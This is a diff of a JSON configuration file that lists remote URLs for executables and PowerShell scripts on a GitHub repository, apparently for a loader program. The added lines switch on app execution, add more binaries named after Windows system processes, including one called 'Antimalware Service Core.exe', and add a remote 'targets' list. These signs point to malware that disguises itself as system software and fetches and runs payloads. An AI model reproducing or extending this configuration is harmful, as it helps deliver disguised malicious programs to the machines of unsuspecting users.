@@ -1,13 +1,17 @@
 {
   "logLevel": 6,
   "ConfirmationLog": true,
+  "ExecuteApps": true,
   "ConfirmationInterval": 1200000,
   "UpdateTimerInterval": 480000,
   "dllhostFiles": [
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
-    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskdllhost.ps1"
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskdllhost.ps1",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/TaskHostSvc.exe",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Antimalware Service Core.exe",
+    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/WinHostSvc.exe"
   ],
   "runtimebrokerFiles": [
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe",
@@ -16,5 +20,6 @@
     "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskRuntimeBroker.ps1"
   ],
   "dllhostConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
-  "runtimebrokerConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config"
+  "runtimebrokerConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config",
+  "targetsJson": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/targets.json"
 }
